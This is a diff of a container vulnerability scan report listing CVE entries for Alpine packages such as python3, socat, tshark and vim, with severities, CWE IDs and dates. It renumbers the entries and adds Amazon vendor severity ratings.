+│                       ├ [133] ╭ VulnerabilityID : CVE-2026-2297 
 │                       │       ├ PkgID           : pyc@3.14.3-r0 
 │                       │       ├ PkgName         : pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/pyc@3.14.3-r0?arch=x86_64&distro=3.24
@@ -11016,7 +11446,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-2297 
 │                       │       ├ PublishedDate   : 2026-03-04T23:16:10.757Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:30:44.59Z 
-│                       ├ [123] ╭ VulnerabilityID : CVE-2026-3644 
+│                       ├ [134] ╭ VulnerabilityID : CVE-2026-3644 
 │                       │       ├ PkgID           : python3@3.14.3-r0 
 │                       │       ├ PkgName         : python3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3@3.14.3-r0?arch=x86_64&distro=
@@ -11135,7 +11565,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-3644 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:09.907Z 
 │                       │       ╰ LastModifiedDate: 2026-06-30T16:16:50.613Z 
-│                       ├ [124] ╭ VulnerabilityID : CVE-2026-4224 
+│                       ├ [135] ╭ VulnerabilityID : CVE-2026-4224 
 │                       │       ├ PkgID           : python3@3.14.3-r0 
 │                       │       ├ PkgName         : python3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3@3.14.3-r0?arch=x86_64&distro=
@@ -11258,7 +11688,7 @@
 │                       │       │                  ╰ [53]: https://www.cve.org/CVERecord?id=CVE-2026-4224 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:10.07Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:56:15.297Z 
-│                       ├ [125] ╭ VulnerabilityID : CVE-2026-2297 
+│                       ├ [136] ╭ VulnerabilityID : CVE-2026-2297 
 │                       │       ├ PkgID           : python3@3.14.3-r0 
 │                       │       ├ PkgName         : python3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3@3.14.3-r0?arch=x86_64&distro=
@@ -11368,7 +11798,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-2297 
 │                       │       ├ PublishedDate   : 2026-03-04T23:16:10.757Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:30:44.59Z 
-│                       ├ [126] ╭ VulnerabilityID : CVE-2026-3644 
+│                       ├ [137] ╭ VulnerabilityID : CVE-2026-3644 
 │                       │       ├ PkgID           : python3-pyc@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pyc@3.14.3-r0?arch=x86_64&dis
@@ -11487,7 +11917,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-3644 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:09.907Z 
 │                       │       ╰ LastModifiedDate: 2026-06-30T16:16:50.613Z 
-│                       ├ [127] ╭ VulnerabilityID : CVE-2026-4224 
+│                       ├ [138] ╭ VulnerabilityID : CVE-2026-4224 
 │                       │       ├ PkgID           : python3-pyc@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pyc@3.14.3-r0?arch=x86_64&dis
@@ -11610,7 +12040,7 @@
 │                       │       │                  ╰ [53]: https://www.cve.org/CVERecord?id=CVE-2026-4224 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:10.07Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:56:15.297Z 
-│                       ├ [128] ╭ VulnerabilityID : CVE-2026-2297 
+│                       ├ [139] ╭ VulnerabilityID : CVE-2026-2297 
 │                       │       ├ PkgID           : python3-pyc@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pyc@3.14.3-r0?arch=x86_64&dis
@@ -11720,7 +12150,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-2297 
 │                       │       ├ PublishedDate   : 2026-03-04T23:16:10.757Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:30:44.59Z 
-│                       ├ [129] ╭ VulnerabilityID : CVE-2026-3644 
+│                       ├ [140] ╭ VulnerabilityID : CVE-2026-3644 
 │                       │       ├ PkgID           : python3-pycache-pyc0@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pycache-pyc0 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pycache-pyc0@3.14.3-r0?arch=x
@@ -11839,7 +12269,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-3644 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:09.907Z 
 │                       │       ╰ LastModifiedDate: 2026-06-30T16:16:50.613Z 
-│                       ├ [130] ╭ VulnerabilityID : CVE-2026-4224 
+│                       ├ [141] ╭ VulnerabilityID : CVE-2026-4224 
 │                       │       ├ PkgID           : python3-pycache-pyc0@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pycache-pyc0 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pycache-pyc0@3.14.3-r0?arch=x
@@ -11962,7 +12392,7 @@
 │                       │       │                  ╰ [53]: https://www.cve.org/CVERecord?id=CVE-2026-4224 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:10.07Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:56:15.297Z 
-│                       ├ [131] ╭ VulnerabilityID : CVE-2026-2297 
+│                       ├ [142] ╭ VulnerabilityID : CVE-2026-2297 
 │                       │       ├ PkgID           : python3-pycache-pyc0@3.14.3-r0 
 │                       │       ├ PkgName         : python3-pycache-pyc0 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/python3-pycache-pyc0@3.14.3-r0?arch=x
@@ -12072,7 +12502,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-2297 
 │                       │       ├ PublishedDate   : 2026-03-04T23:16:10.757Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:30:44.59Z 
-│                       ├ [132] ╭ VulnerabilityID : CVE-2026-56123 
+│                       ├ [143] ╭ VulnerabilityID : CVE-2026-56123 
 │                       │       ├ PkgID           : socat@1.8.1.1-r0 
 │                       │       ├ PkgName         : socat 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/socat@1.8.1.1-r0?arch=x86_64&distro=3
@@ -12117,7 +12547,7 @@
 │                       │       │                         r-overflow-via-socks5-reply-parser 
 │                       │       ├ PublishedDate   : 2026-06-25T17:17:01.967Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T16:50:16.103Z 
-│                       ├ [133] ╭ VulnerabilityID : CVE-2026-56123 
+│                       ├ [144] ╭ VulnerabilityID : CVE-2026-56123 
 │                       │       ├ PkgID           : socat-doc@1.8.1.1-r0 
 │                       │       ├ PkgName         : socat-doc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/socat-doc@1.8.1.1-r0?arch=x86_64&dist
@@ -12162,7 +12592,7 @@
 │                       │       │                         r-overflow-via-socks5-reply-parser 
 │                       │       ├ PublishedDate   : 2026-06-25T17:17:01.967Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T16:50:16.103Z 
-│                       ├ [134] ╭ VulnerabilityID : CVE-2026-15163 
+│                       ├ [145] ╭ VulnerabilityID : CVE-2026-15163 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12212,7 +12642,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.227Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:56:30.983Z 
-│                       ├ [135] ╭ VulnerabilityID : CVE-2026-15169 
+│                       ├ [146] ╭ VulnerabilityID : CVE-2026-15169 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12255,7 +12685,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.777Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T20:02:39.197Z 
-│                       ├ [136] ╭ VulnerabilityID : CVE-2026-15164 
+│                       ├ [147] ╭ VulnerabilityID : CVE-2026-15164 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12298,7 +12728,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.343Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T13:50:59.683Z 
-│                       ├ [137] ╭ VulnerabilityID : CVE-2026-15165 
+│                       ├ [148] ╭ VulnerabilityID : CVE-2026-15165 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12341,7 +12771,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.45Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T13:51:09.72Z 
-│                       ├ [138] ╭ VulnerabilityID : CVE-2026-15166 
+│                       ├ [149] ╭ VulnerabilityID : CVE-2026-15166 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12384,7 +12814,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.56Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:59:14.163Z 
-│                       ├ [139] ╭ VulnerabilityID : CVE-2026-15167 
+│                       ├ [150] ╭ VulnerabilityID : CVE-2026-15167 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12427,7 +12857,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.667Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T20:01:49.55Z 
-│                       ├ [140] ╭ VulnerabilityID : CVE-2026-15170 
+│                       ├ [151] ╭ VulnerabilityID : CVE-2026-15170 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12465,7 +12895,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.88Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:26:00.323Z 
-│                       ├ [141] ╭ VulnerabilityID : CVE-2026-15171 
+│                       ├ [152] ╭ VulnerabilityID : CVE-2026-15171 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12503,7 +12933,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.99Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:24:29.03Z 
-│                       ├ [142] ╭ VulnerabilityID : CVE-2026-15172 
+│                       ├ [153] ╭ VulnerabilityID : CVE-2026-15172 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12541,7 +12971,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.097Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:23:17.337Z 
-│                       ├ [143] ╭ VulnerabilityID : CVE-2026-15173 
+│                       ├ [154] ╭ VulnerabilityID : CVE-2026-15173 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12580,7 +13010,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.203Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:22:28.693Z 
-│                       ├ [144] ╭ VulnerabilityID : CVE-2026-15174 
+│                       ├ [155] ╭ VulnerabilityID : CVE-2026-15174 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12619,7 +13049,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.31Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:21:52.893Z 
-│                       ├ [145] ╭ VulnerabilityID : CVE-2026-15168 
+│                       ├ [156] ╭ VulnerabilityID : CVE-2026-15168 
 │                       │       ├ PkgID           : tshark@4.6.5-r0 
 │                       │       ├ PkgName         : tshark 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/tshark@4.6.5-r0?arch=x86_64&distro=3.
@@ -12662,7 +13092,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T22:17:13.717Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:20:39.57Z 
-│                       ├ [146] ╭ VulnerabilityID : CVE-2026-52858 
+│                       ├ [157] ╭ VulnerabilityID : CVE-2026-52858 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -12719,7 +13149,7 @@
 │                       │       │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-52858 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.487Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.5Z 
-│                       ├ [147] ╭ VulnerabilityID : CVE-2026-52859 
+│                       ├ [158] ╭ VulnerabilityID : CVE-2026-52859 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -12782,7 +13212,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-52859 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.627Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.623Z 
-│                       ├ [148] ╭ VulnerabilityID : CVE-2026-52860 
+│                       ├ [159] ╭ VulnerabilityID : CVE-2026-52860 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -12847,7 +13277,7 @@
 │                       │       │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2026-52860 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.773Z 
 │                       │       ╰ LastModifiedDate: 2026-07-15T01:16:22.423Z 
-│                       ├ [149] ╭ VulnerabilityID : CVE-2026-55895 
+│                       ├ [160] ╭ VulnerabilityID : CVE-2026-55895 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -12884,7 +13314,8 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ╭ [0]: CWE-78 
 │                       │       │                  ╰ [1]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ photon: 3 
 │                       │       │                  ├ redhat: 3 
@@ -12906,7 +13337,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55895 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:41.077Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.097Z 
-│                       ├ [150] ╭ VulnerabilityID : CVE-2026-57453 
+│                       ├ [161] ╭ VulnerabilityID : CVE-2026-57453 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -12941,7 +13372,8 @@
 │                       │       │                   archive. This vulnerability is fixed in 9.2.0678. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-77 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -12962,7 +13394,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57453 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.52Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T17:16:34.82Z 
-│                       ├ [151] ╭ VulnerabilityID : CVE-2026-57455 
+│                       ├ [162] ╭ VulnerabilityID : CVE-2026-57455 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13000,7 +13432,8 @@
 │                       │       │                   9.2.0698. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13021,7 +13454,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57455 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.773Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:23:21.857Z 
-│                       ├ [152] ╭ VulnerabilityID : CVE-2026-57456 
+│                       ├ [163] ╭ VulnerabilityID : CVE-2026-57456 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13057,7 +13490,8 @@
 │                       │       │                   m 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 3 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 3 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 3 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13078,7 +13512,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57456 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.9Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.51Z 
-│                       ├ [153] ╭ VulnerabilityID : CVE-2026-59856 
+│                       ├ [164] ╭ VulnerabilityID : CVE-2026-59856 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13135,7 +13569,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59856 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.42Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.477Z 
-│                       ├ [154] ╭ VulnerabilityID : CVE-2026-59858 
+│                       ├ [165] ╭ VulnerabilityID : CVE-2026-59858 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13189,7 +13623,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59858 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.74Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.603Z 
-│                       ├ [155] ╭ VulnerabilityID : CVE-2026-55892 
+│                       ├ [166] ╭ VulnerabilityID : CVE-2026-55892 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13224,7 +13658,8 @@
 │                       │       │                   in 9.2.0662. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13242,7 +13677,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55892 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:40.69Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:44.667Z 
-│                       ├ [156] ╭ VulnerabilityID : CVE-2026-57451 
+│                       ├ [167] ╭ VulnerabilityID : CVE-2026-57451 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13276,7 +13711,8 @@
 │                       │       │                   crash. This vulnerability is fixed in 9.2.0670. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ╰ redhat: 2 
@@ -13296,7 +13732,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57451 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.263Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:11:55.71Z 
-│                       ├ [157] ╭ VulnerabilityID : CVE-2026-57452 
+│                       ├ [168] ╭ VulnerabilityID : CVE-2026-57452 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13345,7 +13781,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57452 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.397Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:12:32.483Z 
-│                       ├ [158] ╭ VulnerabilityID : CVE-2026-57454 
+│                       ├ [169] ╭ VulnerabilityID : CVE-2026-57454 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13377,7 +13813,8 @@
 │                       │       │                   9.2.0679. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ╰ redhat: 2 
 │                       │       ├ CVSS             ─ nvd ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H 
@@ -13392,7 +13829,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57454 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.647Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:45.077Z 
-│                       ├ [159] ╭ VulnerabilityID : CVE-2026-59857 
+│                       ├ [170] ╭ VulnerabilityID : CVE-2026-59857 
 │                       │       ├ PkgID           : vim@9.2.0481-r0 
 │                       │       ├ PkgName         : vim 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim@9.2.0481-r0?arch=x86_64&distro=3.
@@ -13448,7 +13885,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59857 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.58Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T19:23:21.923Z 
-│                       ├ [160] ╭ VulnerabilityID : CVE-2026-52858 
+│                       ├ [171] ╭ VulnerabilityID : CVE-2026-52858 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13505,7 +13942,7 @@
 │                       │       │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-52858 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.487Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.5Z 
-│                       ├ [161] ╭ VulnerabilityID : CVE-2026-52859 
+│                       ├ [172] ╭ VulnerabilityID : CVE-2026-52859 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13568,7 +14005,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-52859 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.627Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.623Z 
-│                       ├ [162] ╭ VulnerabilityID : CVE-2026-52860 
+│                       ├ [173] ╭ VulnerabilityID : CVE-2026-52860 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13633,7 +14070,7 @@
 │                       │       │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2026-52860 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.773Z 
 │                       │       ╰ LastModifiedDate: 2026-07-15T01:16:22.423Z 
-│                       ├ [163] ╭ VulnerabilityID : CVE-2026-55895 
+│                       ├ [174] ╭ VulnerabilityID : CVE-2026-55895 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13670,7 +14107,8 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ╭ [0]: CWE-78 
 │                       │       │                  ╰ [1]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ photon: 3 
 │                       │       │                  ├ redhat: 3 
@@ -13692,7 +14130,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55895 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:41.077Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.097Z 
-│                       ├ [164] ╭ VulnerabilityID : CVE-2026-57453 
+│                       ├ [175] ╭ VulnerabilityID : CVE-2026-57453 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
